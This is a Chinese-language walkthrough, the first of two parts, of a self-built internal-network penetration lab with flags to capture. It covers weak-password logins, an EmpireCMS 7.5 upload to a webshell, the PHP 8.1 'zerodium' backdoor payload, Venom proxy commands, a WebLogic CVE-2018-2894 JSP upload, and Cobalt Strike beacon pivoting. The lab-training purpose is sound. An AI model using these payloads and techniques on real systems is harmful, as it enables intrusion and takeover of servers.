# 前言
本次靶场为 **红队蓝军** 自行搭建的一个内网域渗透靶场，下面为靶场的拓扑图：
扫描下方二维码关注公众号，回复 **靶场** 获取靶场
内网渗透的本质其实就是信息搜集，在渗透的过程中要仔细的去查看每台主机之间的联系，才会让渗透过程开展得更为顺利。这个靶场涉及到的漏洞其实都是比较老的洞，主要是想记录一下碰到一台主机该如何去分析具体会存在哪些漏洞，因为涉及到的知识点比较多，我将其分为了上、下两个部分来分别记录。
# 外网打点
首先对nmap对当前网段主机进行端口扫描，可以看到有4台主机存活
    nmap -sN -PE 192.168.1.0/24
192.168.1.9开放了22端口即ssh服务，192.168.1.10开放了8080端口猜测是一个web服务，192.168.1.11开放了3306端口即mysql服务，192.168.1.12和192.168.1.13没有扫描出端口特征，但是主机名分别为hack1和hack2
那么首先访问下hack1，80端口下是一个PBOOTCMS
通过
google一下只有2.0.7和2.0.9的，2.0.8需要进入后台进行构造
来到后台页面
通过弱口令`admin/admin123`进入后台
然后通过构造代码执行，但是执行不了，可能是洞被修了
然后再用nmap对192.168.1.12进行具体的扫描，得到88端口，访问是一个帝国cms
通过`/e/admin`来到后台
还是弱口令`admin/admin123`进入后台
EmpireCMS
7.5版本及之前版本在后台备份数据库时,未对数据库表名做验证,通过修改数据库表名可以实现任意代码执行。EmpireCMS7.5版本中的/e/class/moddofun.php文件的”LoadInMod”函数存在安全漏洞,攻击者可利用该漏洞上传任意文件。
点击导入系统模型
然后在本地生成一个`1.php`并改名为`1.php.mod`上传
    ");?>
访问一下没有报错证明上传成功
蚁剑连接`http://192.168.1.12:88/e/admin/getshell.php`即可得到webshell
这里我们拿到webshell后发现h是通过phpstudy搭建的，一个web在80端口，一个在88端口
在根目录下找到了第一个flag
然后查看一下`config.php`配置文件，发现是一个站库分离，且ip为192.168.1.13，就是我们之前通过nmap扫描到的hack2
用蚁剑自带的数据库可视化功能去连接
注意这里不能选择mysql，选择mysql必须是默认端口的情况下
选在MYSQLI自定义3308端口进行连接
得到第二个flag
然后我们再看看之前扫到的8080端口，开局只有一个hello world
这里有两种方法，一种是通过`Wappalyzer`插件查看是一个php8.1
或者抓包发送查看
通过搜索引擎查询php8.1存在一个后门漏洞，直接使用payload
    User-Agentt: zerodiumsystem("ls");
得到了第三个flag
这里其实拿到了两台主机的权限，在进行信息搜集过后，并没有发现mysql和ssh的密码，那么先往内网里面继续进行渗透
# 内网渗透
这里ipconfig一下，发现有双网卡，另一张网卡通向10.10.10.0/24段
那么用cs生成一个木马上传
然后执行命令上线cs，这里我用powershell没有回显不知道咋回事orz...
然后进行同网段存活主机的扫描，这里一般会用cs自带的端口扫描，但是这里如果用他自带的端口扫描就有一个弊端，cs的端口扫描默认是扫一个大段，而这里又是10段的ip，所以如果使用cs自带的端口扫描的话时间就会偏长
那么这里我们直接自己使用命令扫描10.10.10.1-10.10.10.255的存活主机
    portscan 10.10.10.1-255 1-1000,3389,6000-9999
扫完之后我们得到了一个ip为10.10.10.10的存活主机且有7001特征端口
那么首先进行流量代理，这里我用的是venom，cs的代理不稳定所以我就没有使用
本地监听9999端口
    admin.exe -lport 9999
执行命令代理到本地的6666端口
    agent.exe -rhost 192.168.1.2 -rport 9999
然后配置浏览器代理
即可访问到7001端口
这里假如不知道7001端口为weblogic特征端口，就可以拿着报错去百度，也能够得到为weblogic框架
再访问一下weblogic的后台
得到weblogic的版本为12.2.1.3，这里weblogic的漏洞应该是CVE-2018-2894，但是需要进入后台打开web测试页，这里尝试了弱口令并没有登入成功
只能在之前两台主机里面进行信息搜集，在数据库里面发现了疑似后台的账号密码
登入成功
打开web测试页
访问`http://10.10.10.10:7001/ws_utc/config.do`这里的工作目录不修改直接上传jsp的话是访问不到的，所以我们需要将路径更改为我们能够有权限访问的目录
修改工作目录为以下路径
    C:\Oracle\Middleware\Oracle_Home\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\com.oracle.webservices.wls.ws-testclient-app-wls\4mcj4y\war\css
再上传Keystore，这里上传冰蝎马即可
然后f12审查元素得到时间戳为`1641526585016`
构造得到`http://10.10.10.10:7001/ws_utc/css/config/keystore/1641527581712_ice.jsp`，访问一下没有报错证明上传成功
开启冰蝎代理
连接成功
在根目录下找到了第4个flag
还发现了一个`root.txt`，之前好像也没有扫出tomcat，试着连一下ssh
连接成功，拿到了第五个flag
然后ipconfig看一下，有一张10.10.10.0/24段的网卡，这里上cs的话就要注意了，因为是处于不出网环境，就需要用到TCP beacon进行上线
这里参考了hxd的[不出网主机的几种上线方式](https://www.anquanke.com/post/id/254671)
> 这种方式一般试用于：密码撞不上，内网机器有web服务。
我们首先需要建立一个TCP Beacon的监听
这里需要用到无状态的后门，即Stageless，相对的就是Stager
>
> Stager是分步式，分阶段的，只用少部分代码来请求和加载payload，cs的加载payload模式为反射加载beacon.dll，但这个beacon.dll并不在可执行文件中，而是在远程C2服务端。
>
>
> Stageless则是将beacon.dll包含在可执行文件中，并且可能有写额外的操作，于是文件比较大，特征也更明显，但是适合横向不出网机器，因为不出网所以有可能请求不了c2服务端上的beacon.dll。
将生成的beacon.exe上传到根目录下，但是这里有个问题，因为我们拿到的是一个user权限的webshell，因为权限的问题是不能直接在根目录进行操作的，所以报错，这里就需要找一个能够可执行的路径，一般是tmp目录
这里成功上传
然后执行`beacon.exe`
使用`connect 10.10.10.10`命令连接即可上线cs
然后因为这里是一个user权限，能操作的空间比较小，所以我们需要先进行提权
先用了插件提权，把梼杌的提权插件试完了都没有成功。这里提权有点坑，我们放到下半部分来继续说。